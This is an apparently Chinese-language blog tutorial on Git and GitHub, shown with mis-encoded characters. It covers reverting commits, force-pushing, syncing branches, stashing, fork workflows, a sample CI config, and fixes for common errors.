<h2 id="äº”ã€æäº¤å†å²ç®¡ç†"><a href="#äº”ã€æäº¤å†å²ç®¡ç†" class="headerlink" title="äº”ã€æäº¤å†å²ç®¡ç†"></a>äº”ã€æäº¤å†å²ç®¡ç†</h2><h3 id="1-æ’¤é”€é”™è¯¯æäº¤"><a href="#1-æ’¤é”€é”™è¯¯æäº¤" class="headerlink" title="1. æ’¤é”€é”™è¯¯æäº¤"></a>1. æ’¤é”€é”™è¯¯æäº¤</h3><h4 id="æ–¹æ³•ä¸€ï¼šç›´æ¥å›é€€å†å²ï¼ˆä¸ªäººä»“åº“é€‚ç”¨ï¼‰"><a href="#æ–¹æ³•ä¸€ï¼šç›´æ¥å›é€€å†å²ï¼ˆä¸ªäººä»“åº“é€‚ç”¨ï¼‰" class="headerlink" title="æ–¹æ³•ä¸€ï¼šç›´æ¥å›é€€å†å²ï¼ˆä¸ªäººä»“åº“é€‚ç”¨ï¼‰"></a>æ–¹æ³•ä¸€ï¼šç›´æ¥å›é€€å†å²ï¼ˆä¸ªäººä»“åº“é€‚ç”¨ï¼‰</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. å›é€€åˆ°æ­£ç¡®æäº¤ï¼ˆ92d433f ä¸ºæ­£ç¡®æäº¤IDï¼‰</span></span><br><span class="line">git reset --hard 92d433f</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. å¼ºåˆ¶æ¨é€åˆ°è¿œç¨‹</span></span><br><span class="line">git push origin main --force</span><br></pre></td></tr></table></figure>

<h4 id="æ–¹æ³•äºŒï¼šåˆ›å»ºæ’¤é”€æäº¤ï¼ˆå¤šäººåä½œé€‚ç”¨ï¼‰"><a href="#æ–¹æ³•äºŒï¼šåˆ›å»ºæ’¤é”€æäº¤ï¼ˆå¤šäººåä½œé€‚ç”¨ï¼‰" class="headerlink" title="æ–¹æ³•äºŒï¼šåˆ›å»ºæ’¤é”€æäº¤ï¼ˆå¤šäººåä½œé€‚ç”¨ï¼‰"></a>æ–¹æ³•äºŒï¼šåˆ›å»ºæ’¤é”€æäº¤ï¼ˆå¤šäººåä½œé€‚ç”¨ï¼‰</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. ç”Ÿæˆæ’¤é”€æäº¤ï¼ˆ0dec4f6 ä¸ºé”™è¯¯æäº¤IDï¼‰</span></span><br><span class="line">git revert 0dec4f6</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. æ¨é€æ’¤é”€æäº¤</span></span><br><span class="line">git push origin main</span><br></pre></td></tr></table></figure>

<h4 id="åç»­æ“ä½œ"><a href="#åç»­æ“ä½œ" class="headerlink" title="åç»­æ“ä½œ"></a>åç»­æ“ä½œ</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;æ­£ç¡®çš„æäº¤ä¿¡æ¯&quot;</span></span><br><span class="line">git push</span><br></pre></td></tr></table></figure>

<h3 id="2-ä¿®å¤æœ¬åœ°åˆ†æ”¯ä¸è¿œç¨‹åˆ†æ”¯åç¦»é—®é¢˜"><a href="#2-ä¿®å¤æœ¬åœ°åˆ†æ”¯ä¸è¿œç¨‹åˆ†æ”¯åç¦»é—®é¢˜" class="headerlink" title="2. ä¿®å¤æœ¬åœ°åˆ†æ”¯ä¸è¿œç¨‹åˆ†æ”¯åç¦»é—®é¢˜"></a>2. ä¿®å¤æœ¬åœ°åˆ†æ”¯ä¸è¿œç¨‹åˆ†æ”¯åç¦»é—®é¢˜</h3><h4 id="é—®é¢˜åŸå› "><a href="#é—®é¢˜åŸå› " class="headerlink" title="é—®é¢˜åŸå› "></a>é—®é¢˜åŸå› </h4><p>æœ¬åœ°åˆ†æ”¯å†å²ä¸è¿œç¨‹åˆ†æ”¯å†å²ä¸ä¸€è‡´ï¼ˆæœ¬åœ°åŒ…å«è¿œç¨‹å·²ç§»é™¤çš„æäº¤ï¼‰</p>
<h4 id="è§£å†³æ­¥éª¤"><a href="#è§£å†³æ­¥éª¤" class="headerlink" title="è§£å†³æ­¥éª¤"></a>è§£å†³æ­¥éª¤</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. ä¿å­˜æœªæäº¤çš„ä¿®æ”¹ï¼ˆå¦‚æœ‰ï¼‰</span></span><br><span class="line">git stash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. å¼ºåˆ¶åŒæ­¥æœ¬åœ°åˆ†æ”¯ä¸è¿œç¨‹åˆ†æ”¯</span></span><br><span class="line">git reset --hard origin/main</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. ç¡®è®¤åŒæ­¥å®Œæˆ</span></span><br><span class="line">git pull origin main</span><br></pre></td></tr></table></figure>

<h4 id="åŸç†è¯´æ˜"><a href="#åŸç†è¯´æ˜" class="headerlink" title="åŸç†è¯´æ˜"></a>åŸç†è¯´æ˜</h4><p>é€šè¿‡ <code>git reset --hard origin/main</code> å°†æœ¬åœ°åˆ†æ”¯å®Œå…¨é‡ç½®ä¸ºä¸è¿œç¨‹åˆ†æ”¯ä¸€è‡´çš„çŠ¶æ€ï¼Œè¦†ç›–æœ¬åœ°ä¸è¿œç¨‹ä¸ä¸€è‡´çš„å†å²ã€‚</p>
<h2 id="å…­ã€é«˜çº§åˆ†æ”¯åŒæ­¥æŠ€å·§"><a href="#å…­ã€é«˜çº§åˆ†æ”¯åŒæ­¥æŠ€å·§" class="headerlink" title="å…­ã€é«˜çº§åˆ†æ”¯åŒæ­¥æŠ€å·§"></a>å…­ã€é«˜çº§åˆ†æ”¯åŒæ­¥æŠ€å·§</h2><h3 id="1-åŒæ­¥ç‰¹å®šè¿œç¨‹åˆ†æ”¯"><a href="#1-åŒæ­¥ç‰¹å®šè¿œç¨‹åˆ†æ”¯" class="headerlink" title="1. åŒæ­¥ç‰¹å®šè¿œç¨‹åˆ†æ”¯"></a>1. åŒæ­¥ç‰¹å®šè¿œç¨‹åˆ†æ”¯</h3><p>å½“éœ€è¦åŒæ­¥ç‰¹å®šè¿œç¨‹åˆ†æ”¯æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å…ˆè·å–æ‰€æœ‰è¿œç¨‹åˆ†æ”¯</span></span><br><span class="line">git fetch origin</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºæœ¬åœ°åˆ†æ”¯è·Ÿè¸ªè¿œç¨‹åˆ†æ”¯</span></span><br><span class="line">git checkout -b æœ¬åœ°åˆ†æ”¯å origin/è¿œç¨‹åˆ†æ”¯å</span><br><span class="line"></span><br><span class="line"><span class="comment"># æˆ–ç›´æ¥é‡ç½®å½“å‰åˆ†æ”¯åˆ°è¿œç¨‹åˆ†æ”¯</span></span><br><span class="line">git reset --hard origin/è¿œç¨‹åˆ†æ”¯å</span><br></pre></td></tr></table></figure>

<h3 id="2-åŒæ­¥å¤šä¸ªç‰¹å®šåˆ†æ”¯"><a href="#2-åŒæ­¥å¤šä¸ªç‰¹å®šåˆ†æ”¯" class="headerlink" title="2. åŒæ­¥å¤šä¸ªç‰¹å®šåˆ†æ”¯"></a>2. åŒæ­¥å¤šä¸ªç‰¹å®šåˆ†æ”¯</h3><p>Git æœ¬èº«ä¸æ”¯æŒä¸€æ¬¡æ€§åŒæ­¥å¤šä¸ªåˆ†æ”¯ï¼Œä½†å¯ä»¥é€šè¿‡è„šæœ¬æ‰¹é‡æ“ä½œï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åŒæ­¥å¤šä¸ªåˆ†æ”¯</span></span><br><span class="line">git fetch origin</span><br><span class="line">git reset --hard origin/main</span><br><span class="line">git checkout dev</span><br><span class="line">git reset --hard origin/dev</span><br><span class="line">git checkout feature-branch</span><br><span class="line">git reset --hard origin/feature-branch</span><br></pre></td></tr></table></figure>

<h3 id="3-åŒæ­¥è¿œç¨‹ä»“åº“çš„æ‰€æœ‰åˆ†æ”¯"><a href="#3-åŒæ­¥è¿œç¨‹ä»“åº“çš„æ‰€æœ‰åˆ†æ”¯" class="headerlink" title="3. åŒæ­¥è¿œç¨‹ä»“åº“çš„æ‰€æœ‰åˆ†æ”¯"></a>3. åŒæ­¥è¿œç¨‹ä»“åº“çš„æ‰€æœ‰åˆ†æ”¯</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è·å–æ‰€æœ‰è¿œç¨‹åˆ†æ”¯</span></span><br><span class="line">git fetch --all</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸ºæ¯ä¸ªè¿œç¨‹åˆ†æ”¯åˆ›å»ºæœ¬åœ°åˆ†æ”¯</span></span><br><span class="line">git branch -r | grep -v <span class="string">&#x27;\-&gt;&#x27;</span> | <span class="keyword">while</span> <span class="built_in">read</span> remote; <span class="keyword">do</span> git branch --track <span class="string">&quot;<span class="variable">$&#123;remote#origin/&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$remote</span>&quot;</span>; <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æˆ–åˆ é™¤æ‰€æœ‰æœ¬åœ°åˆ†æ”¯åé‡æ–°åˆ›å»º</span></span><br><span class="line">git branch | grep -v <span class="string">&quot;main&quot;</span> | xargs git branch -D</span><br><span class="line">git fetch --all</span><br><span class="line">git branch -r | grep -v <span class="string">&#x27;\-&gt;&#x27;</span> | <span class="keyword">while</span> <span class="built_in">read</span> remote; <span class="keyword">do</span> git branch --track <span class="string">&quot;<span class="variable">$&#123;remote#origin/&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$remote</span>&quot;</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<h3 id="4-é‡ç½®è¿œç¨‹åˆ†æ”¯åˆ°ç‰¹å®šæäº¤"><a href="#4-é‡ç½®è¿œç¨‹åˆ†æ”¯åˆ°ç‰¹å®šæäº¤" class="headerlink" title="4. é‡ç½®è¿œç¨‹åˆ†æ”¯åˆ°ç‰¹å®šæäº¤"></a>4. é‡ç½®è¿œç¨‹åˆ†æ”¯åˆ°ç‰¹å®šæäº¤</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># éœ€è¦æœ‰æƒé™</span></span><br><span class="line">git push origin --force 0dec4f6:main</span><br></pre></td></tr></table></figure>

<h3 id="5-æŸ¥çœ‹åˆ†æ”¯å·®å¼‚"><a href="#5-æŸ¥çœ‹åˆ†æ”¯å·®å¼‚" class="headerlink" title="5. æŸ¥çœ‹åˆ†æ”¯å·®å¼‚"></a>5. æŸ¥çœ‹åˆ†æ”¯å·®å¼‚</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹æœ¬åœ°æ¯”è¿œç¨‹å¤šå‡ºçš„æäº¤</span></span><br><span class="line">git <span class="built_in">log</span> origin/main..main</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹è¿œç¨‹æ¯”æœ¬åœ°å¤šå‡ºçš„æäº¤</span></span><br><span class="line">git <span class="built_in">log</span> main..origin/main</span><br></pre></td></tr></table></figure>

<h2 id="ä¸ƒã€å…¶ä»–å®ç”¨æŠ€å·§"><a href="#ä¸ƒã€å…¶ä»–å®ç”¨æŠ€å·§" class="headerlink" title="ä¸ƒã€å…¶ä»–å®ç”¨æŠ€å·§"></a>ä¸ƒã€å…¶ä»–å®ç”¨æŠ€å·§</h2><h3 id="1-åˆ†æ”¯ç®¡ç†"><a href="#1-åˆ†æ”¯ç®¡ç†" class="headerlink" title="1. åˆ†æ”¯ç®¡ç†"></a>1. åˆ†æ”¯ç®¡ç†</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git branch -a  <span class="comment"># æŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯ï¼ˆæœ¬åœ°å’Œè¿œç¨‹ï¼‰</span></span><br><span class="line">git branch -d åˆ†æ”¯å  <span class="comment"># å®‰å…¨åˆ é™¤ï¼ˆå·²åˆå¹¶ï¼‰</span></span><br><span class="line">git branch -D åˆ†æ”¯å  <span class="comment"># å¼ºåˆ¶åˆ é™¤ï¼ˆæœªåˆå¹¶ï¼‰</span></span><br><span class="line">git branch -m æ—§åˆ†æ”¯å æ–°åˆ†æ”¯å  <span class="comment"># é‡å‘½åå½“å‰åˆ†æ”¯</span></span><br><span class="line">git branch --set-upstream-to=origin/åˆ†æ”¯å æœ¬åœ°åˆ†æ”¯å  <span class="comment"># é‡ç½®è¿œç¨‹è·Ÿè¸ªåˆ†æ”¯</span></span><br></pre></td></tr></table></figure>

<h3 id="2-æš‚å­˜ä¸æ¢å¤"><a href="#2-æš‚å­˜ä¸æ¢å¤" class="headerlink" title="2. æš‚å­˜ä¸æ¢å¤"></a>2. æš‚å­˜ä¸æ¢å¤</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git stash  <span class="comment"># æš‚å­˜æœªæäº¤ä¿®æ”¹</span></span><br><span class="line">git stash list  <span class="comment"># æŸ¥çœ‹æ‰€æœ‰æš‚å­˜</span></span><br><span class="line">git stash pop  <span class="comment"># æ¢å¤æœ€æ–°æš‚å­˜</span></span><br><span class="line">git stash pop stash@&#123;n&#125;  <span class="comment"># æ¢å¤æŒ‡å®šæš‚å­˜</span></span><br><span class="line">git stash drop stash@&#123;n&#125;  <span class="comment"># åˆ é™¤æŒ‡å®šæš‚å­˜</span></span><br></pre></td></tr></table></figure>

<h3 id="3-æ’¤é”€ä¿®æ”¹"><a href="#3-æ’¤é”€ä¿®æ”¹" class="headerlink" title="3. æ’¤é”€ä¿®æ”¹"></a>3. æ’¤é”€ä¿®æ”¹</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout -- æ–‡ä»¶å  <span class="comment"># æ’¤é”€å·¥ä½œåŒºä¿®æ”¹</span></span><br><span class="line">git checkout .  <span class="comment"># æ’¤é”€æ‰€æœ‰å·¥ä½œåŒºä¿®æ”¹</span></span><br></pre></td></tr></table></figure>

<h3 id="4-æäº¤å†å²æŸ¥çœ‹"><a href="#4-æäº¤å†å²æŸ¥çœ‹" class="headerlink" title="4. æäº¤å†å²æŸ¥çœ‹"></a>4. æäº¤å†å²æŸ¥çœ‹</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">log</span> -p  <span class="comment"># æ˜¾ç¤ºæ¯æ¬¡æäº¤çš„è¯¦ç»†å˜åŒ–</span></span><br><span class="line">git <span class="built_in">log</span> --<span class="built_in">stat</span>  <span class="comment"># æ˜¾ç¤ºæ¯æ¬¡æäº¤çš„ç»Ÿè®¡ä¿¡æ¯</span></span><br><span class="line">git <span class="built_in">log</span> --graph --oneline --all  <span class="comment"># å›¾å½¢åŒ–æ˜¾ç¤ºåˆ†æ”¯å†å²</span></span><br><span class="line">git show æäº¤ID  <span class="comment"># æŸ¥çœ‹æŸæ¬¡æäº¤çš„è¯¦ç»†å†…å®¹</span></span><br><span class="line">git add -p  <span class="comment"># äº¤äº’å¼é€‰æ‹©è¦æ·»åŠ çš„ä¿®æ”¹</span></span><br></pre></td></tr></table></figure>

<h3 id="5-æ‹‰å–ç‰¹å®šæ–‡ä»¶"><a href="#5-æ‹‰å–ç‰¹å®šæ–‡ä»¶" class="headerlink" title="5. æ‹‰å–ç‰¹å®šæ–‡ä»¶"></a>5. æ‹‰å–ç‰¹å®šæ–‡ä»¶</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout origin/åˆ†æ”¯å -- æ–‡ä»¶è·¯å¾„  <span class="comment"># ä»è¿œç¨‹åˆ†æ”¯æ‹‰å–ç‰¹å®šæ–‡ä»¶</span></span><br></pre></td></tr></table></figure>

<h2 id="å…«ã€å¤šä»“åº“åä½œ"><a href="#å…«ã€å¤šä»“åº“åä½œ" class="headerlink" title="å…«ã€å¤šä»“åº“åä½œ"></a>å…«ã€å¤šä»“åº“åä½œ</h2><h3 id="1-æ·»åŠ å¤šä¸ªè¿œç¨‹ä»“åº“"><a href="#1-æ·»åŠ å¤šä¸ªè¿œç¨‹ä»“åº“" class="headerlink" title="1. æ·»åŠ å¤šä¸ªè¿œç¨‹ä»“åº“"></a>1. æ·»åŠ å¤šä¸ªè¿œç¨‹ä»“åº“</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ·»åŠ ä¸Šæ¸¸ä»“åº“ï¼ˆåŸå§‹é¡¹ç›®ï¼‰</span></span><br><span class="line">git remote add upstream https://github.com/åŸä½œè€…/ä»“åº“.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ·»åŠ è‡ªå·±çš„fork</span></span><br><span class="line">git remote add fork https://github.com/ä½ çš„ç”¨æˆ·å/ä»“åº“.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹æ‰€æœ‰è¿œç¨‹ä»“åº“</span></span><br><span class="line">git remote -v</span><br></pre></td></tr></table></figure>

<h3 id="2-ä»ä¸Šæ¸¸ä»“åº“æ‹‰å–æ›´æ–°"><a href="#2-ä»ä¸Šæ¸¸ä»“åº“æ‹‰å–æ›´æ–°" class="headerlink" title="2. ä»ä¸Šæ¸¸ä»“åº“æ‹‰å–æ›´æ–°"></a>2. ä»ä¸Šæ¸¸ä»“åº“æ‹‰å–æ›´æ–°</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è·å–ä¸Šæ¸¸ä»“åº“æ›´æ–°</span></span><br><span class="line">git fetch upstream</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆå¹¶åˆ°å½“å‰åˆ†æ”¯</span></span><br><span class="line">git merge upstream/main</span><br><span class="line"></span><br><span class="line"><span class="comment"># æˆ–ä½¿ç”¨rebaseä¿æŒæäº¤å†å²çº¿æ€§</span></span><br><span class="line">git rebase upstream/main</span><br></pre></td></tr></table></figure>

<h3 id="3-åŒæ­¥forkä¸ä¸Šæ¸¸ä»“åº“"><a href="#3-åŒæ­¥forkä¸ä¸Šæ¸¸ä»“åº“" class="headerlink" title="3. åŒæ­¥forkä¸ä¸Šæ¸¸ä»“åº“"></a>3. åŒæ­¥forkä¸ä¸Šæ¸¸ä»“åº“</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. æ·»åŠ ä¸Šæ¸¸ä»“åº“</span></span><br><span class="line">git remote add upstream https://github.com/åŸä½œè€…/ä»“åº“.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. è·å–ä¸Šæ¸¸æ›´æ–°</span></span><br><span class="line">git fetch upstream</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. åˆå¹¶åˆ°æœ¬åœ°mainåˆ†æ”¯</span></span><br><span class="line">git checkout main</span><br><span class="line">git merge upstream/main</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. æ¨é€åˆ°è‡ªå·±çš„fork</span></span><br><span class="line">git push fork main</span><br></pre></td></tr></table></figure>

<h2 id="ä¹ã€GitHubé«˜çº§åŠŸèƒ½"><a href="#ä¹ã€GitHubé«˜çº§åŠŸèƒ½" class="headerlink" title="ä¹ã€GitHubé«˜çº§åŠŸèƒ½"></a>ä¹ã€GitHubé«˜çº§åŠŸèƒ½</h2><h3 id="1-GitHub-Copilot"><a href="#1-GitHub-Copilot" class="headerlink" title="1. GitHub Copilot"></a>1. GitHub Copilot</h3><ul>
<li>AIè¾…åŠ©ç¼–ç¨‹ï¼Œä»ç®€å•æ¨¡æ¿åˆ°å¤æ‚åŠŸèƒ½</li>
<li>æ”¯æŒå¤šç§ç¼–ç¨‹è¯­è¨€</li>
<li>é›†æˆåœ¨VS Codeã€JetBrainsç­‰IDEä¸­</li>
</ul>
<h3 id="2-GitHub-Actions"><a href="#2-GitHub-Actions" class="headerlink" title="2. GitHub Actions"></a>2. GitHub Actions</h3><ul>
<li>è‡ªåŠ¨åŒ–å·¥ä½œæµ</li>
<li>CI&#x2F;CDæµæ°´çº¿</li>
<li>è‡ªåŠ¨æµ‹è¯•å’Œéƒ¨ç½²</li>
<li>ç¤ºä¾‹é…ç½®ï¼š<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">CI</span></span><br><span class="line"><span class="attr">on:</span> [<span class="string">push</span>]</span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">build:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Run</span> <span class="string">tests</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">        npm install</span></span><br><span class="line"><span class="string">        npm test</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="3-GitHub-Security"><a href="#3-GitHub-Security" class="headerlink" title="3. GitHub Security"></a>3. GitHub Security</h3><ul>
<li><strong>Code Scanning</strong>ï¼šè‡ªåŠ¨æ‰«æä»£ç æ¼æ´</li>
<li><strong>Dependabot</strong>ï¼šè‡ªåŠ¨æ›´æ–°ä¾èµ–é¡¹</li>
<li><strong>Secret Scanning</strong>ï¼šæ£€æµ‹æ³„éœ²çš„å¯†é’¥</li>
<li><strong>Security Alerts</strong>ï¼šå®‰å…¨æ¼æ´é€šçŸ¥</li>
</ul>
<h3 id="4-GitHub-Projects"><a href="#4-GitHub-Projects" class="headerlink" title="4. GitHub Projects"></a>4. GitHub Projects</h3><ul>
<li>é¡¹ç›®ç®¡ç†å·¥å…·</li>
<li>Kanbançœ‹æ¿</li>
<li>ä»»åŠ¡è·Ÿè¸ª</li>
<li>ä¸Issuesé›†æˆ</li>
</ul>
<h3 id="5-GitHub-Codespaces"><a href="#5-GitHub-Codespaces" class="headerlink" title="5. GitHub Codespaces"></a>5. GitHub Codespaces</h3><ul>
<li>äº‘ç«¯å¼€å‘ç¯å¢ƒ</li>
<li>é›†æˆVS Code</li>
<li>æŒ‰éœ€å¯åŠ¨</li>
<li>æ— ç¼åä½œ</li>
</ul>
<h2 id="åã€æœ€ä½³å®è·µ"><a href="#åã€æœ€ä½³å®è·µ" class="headerlink" title="åã€æœ€ä½³å®è·µ"></a>åã€æœ€ä½³å®è·µ</h2><h3 id="1-åˆ†æ”¯ç­–ç•¥"><a href="#1-åˆ†æ”¯ç­–ç•¥" class="headerlink" title="1. åˆ†æ”¯ç­–ç•¥"></a>1. åˆ†æ”¯ç­–ç•¥</h3><ul>
<li><strong>ä¸»åˆ†æ”¯</strong>ï¼šmain&#x2F;master - ç”¨äºç”Ÿäº§ç¯å¢ƒ</li>
<li><strong>å¼€å‘åˆ†æ”¯</strong>ï¼šdev - ç”¨äºé›†æˆæµ‹è¯•</li>
<li><strong>åŠŸèƒ½åˆ†æ”¯</strong>ï¼šfeature&#x2F;xxx - ç”¨äºå¼€å‘æ–°åŠŸèƒ½</li>
<li><strong>ä¿®å¤åˆ†æ”¯</strong>ï¼šhotfix&#x2F;xxx - ç”¨äºç´§æ€¥ä¿®å¤</li>
</ul>
<h3 id="2-æäº¤è§„èŒƒ"><a href="#2-æäº¤è§„èŒƒ" class="headerlink" title="2. æäº¤è§„èŒƒ"></a>2. æäº¤è§„èŒƒ</h3><ul>
<li>æäº¤ä¿¡æ¯åº”æ¸…æ™°æè¿°ä¿®æ”¹å†…å®¹</li>
<li>ä½¿ç”¨â€feat:â€, â€œfix:â€, â€œdocs:â€, â€œstyle:â€, â€œrefactor:â€, â€œtest:â€, â€œchore:â€ç­‰å‰ç¼€</li>
<li>ç¤ºä¾‹ï¼š<code>feat: æ·»åŠ ç”¨æˆ·ç™»å½•åŠŸèƒ½</code></li>
</ul>
<h3 id="3-ä»£ç å®¡æŸ¥"><a href="#3-ä»£ç å®¡æŸ¥" class="headerlink" title="3. ä»£ç å®¡æŸ¥"></a>3. ä»£ç å®¡æŸ¥</h3><ul>
<li>ä¸€æ¬¡å®¡æŸ¥ä¸è¶…è¿‡200è¡Œä»£ç </li>
<li>ä¸“æ³¨äºé€»è¾‘é—®é¢˜è€Œéé£æ ¼é—®é¢˜</li>
<li>æä¾›å…·ä½“å»ºè®®è€Œéæ³›æ³›è€Œè°ˆ</li>
<li>ä½¿ç”¨GitHubçš„ReviewåŠŸèƒ½</li>
</ul>
<h3 id="4-å®šæœŸåŒæ­¥"><a href="#4-å®šæœŸåŒæ­¥" class="headerlink" title="4. å®šæœŸåŒæ­¥"></a>4. å®šæœŸåŒæ­¥</h3><ul>
<li>æ¯å¤©è‡³å°‘pullä¸€æ¬¡æœ€æ–°ä»£ç </li>
<li>åœ¨å¼€å§‹æ–°åŠŸèƒ½å‰å…ˆåŒæ­¥è¿œç¨‹ä»£ç </li>
</ul>
<h3 id="5-å°æ­¥æäº¤"><a href="#5-å°æ­¥æäº¤" class="headerlink" title="5. å°æ­¥æäº¤"></a>5. å°æ­¥æäº¤</h3><ul>
<li>æ¯æ¬¡æäº¤åªåŒ…å«ä¸€ä¸ªé€»è¾‘å˜æ›´</li>
<li>ä¸è¦å°†å¤šä¸ªä¸ç›¸å…³çš„ä¿®æ”¹æ”¾åœ¨ä¸€ä¸ªæäº¤ä¸­</li>
</ul>
<h2 id="åä¸€ã€å¸¸è§é—®é¢˜è§£å†³æ–¹æ¡ˆ"><a href="#åä¸€ã€å¸¸è§é—®é¢˜è§£å†³æ–¹æ¡ˆ" class="headerlink" title="åä¸€ã€å¸¸è§é—®é¢˜è§£å†³æ–¹æ¡ˆ"></a>åä¸€ã€å¸¸è§é—®é¢˜è§£å†³æ–¹æ¡ˆ</h2><h3 id="1-â€œPermission-denied-publickey-â€-é”™è¯¯"><a href="#1-â€œPermission-denied-publickey-â€-é”™è¯¯" class="headerlink" title="1. â€œPermission denied (publickey)â€ é”™è¯¯"></a>1. â€œPermission denied (publickey)â€ é”™è¯¯</h3><ul>
<li>ç¡®è®¤SSHå¯†é’¥å·²æ·»åŠ åˆ°GitHub</li>
<li>æ£€æŸ¥å¯†é’¥æƒé™æ˜¯å¦æ­£ç¡®</li>
<li>æµ‹è¯•SSHè¿æ¥ï¼š<code>ssh -T git@github.com</code></li>
</ul>
<h3 id="2-â€œfatal-not-a-git-repositoryâ€-é”™è¯¯"><a href="#2-â€œfatal-not-a-git-repositoryâ€-é”™è¯¯" class="headerlink" title="2. â€œfatal: not a git repositoryâ€ é”™è¯¯"></a>2. â€œfatal: not a git repositoryâ€ é”™è¯¯</h3><ul>
<li>ç¡®ä¿åœ¨Gitä»“åº“ç›®å½•å†…æ“ä½œ</li>
<li>ä½¿ç”¨<code>git init</code>åˆå§‹åŒ–ä»“åº“</li>
</ul>
<h3 id="3-â€œremote-origin-already-existsâ€-é”™è¯¯"><a href="#3-â€œremote-origin-already-existsâ€-é”™è¯¯" class="headerlink" title="3. â€œremote origin already existsâ€ é”™è¯¯"></a>3. â€œremote origin already existsâ€ é”™è¯¯</h3><ul>
<li>ä½¿ç”¨<code>git remote set-url origin [æ–°åœ°å€]</code>ä¿®æ”¹åœ°å€</li>
<li>æˆ–å…ˆåˆ é™¤è¿œç¨‹ï¼š<code>git remote remove origin</code></li>
</ul>
<h3 id="4-â€œunable-to-update-local-refâ€-é”™è¯¯"><a href="#4-â€œunable-to-update-local-refâ€-é”™è¯¯" class="headerlink" title="4. â€œunable to update local refâ€ é”™è¯¯"></a>4. â€œunable to update local refâ€ é”™è¯¯</h3><ul>
<li>æ¸…ç†æœ¬åœ°å¼•ç”¨ï¼š<code>git remote prune origin</code></li>
<li>é‡ç½®æœ¬åœ°åˆ†æ”¯ï¼š<code>git reset --hard origin/main</code></li>
</ul>
<h3 id="5-â€œdetached-HEADâ€-çŠ¶æ€"><a href="#5-â€œdetached-HEADâ€-çŠ¶æ€" class="headerlink" title="5. â€œdetached HEADâ€ çŠ¶æ€"></a>5. â€œdetached HEADâ€ çŠ¶æ€</h3><ul>
<li>åˆ›å»ºæ–°åˆ†æ”¯ï¼š<code>git checkout -b æ–°åˆ†æ”¯å</code></li>
<li>æˆ–å›åˆ°å·²æœ‰åˆ†æ”¯ï¼š<code>git checkout main</code></li>
</ul>
<h3 id="6-â€œrefusing-to-merge-unrelated-historiesâ€-é”™è¯¯"><a href="#6-â€œrefusing-to-merge-unrelated-historiesâ€-é”™è¯¯" class="headerlink" title="6. â€œrefusing to merge unrelated historiesâ€ é”™è¯¯"></a>6. â€œrefusing to merge unrelated historiesâ€ é”™è¯¯</h3><ul>
<li>ä½¿ç”¨<code>git pull origin main --allow-unrelated-histories</code></li>
</ul>
<h3 id="7-â€œYour-branch-is-ahead-of-â€˜origin-mainâ€™-by-X-commitsâ€-é”™è¯¯"><a href="#7-â€œYour-branch-is-ahead-of-â€˜origin-mainâ€™-by-X-commitsâ€-é”™è¯¯" class="headerlink" title="7. â€œYour branch is ahead of â€˜origin&#x2F;mainâ€™ by X commitsâ€ é”™è¯¯"></a>7. â€œYour branch is ahead of â€˜origin&#x2F;mainâ€™ by X commitsâ€ é”™è¯¯</h3><ul>
<li>ç¡®è®¤æ˜¯å¦éœ€è¦å¼ºåˆ¶æ¨é€ï¼š<code>git push --force</code></li>
<li>æˆ–æ‹‰å–è¿œç¨‹æ›´æ”¹ï¼š<code>git pull origin main</code></li>
</ul>
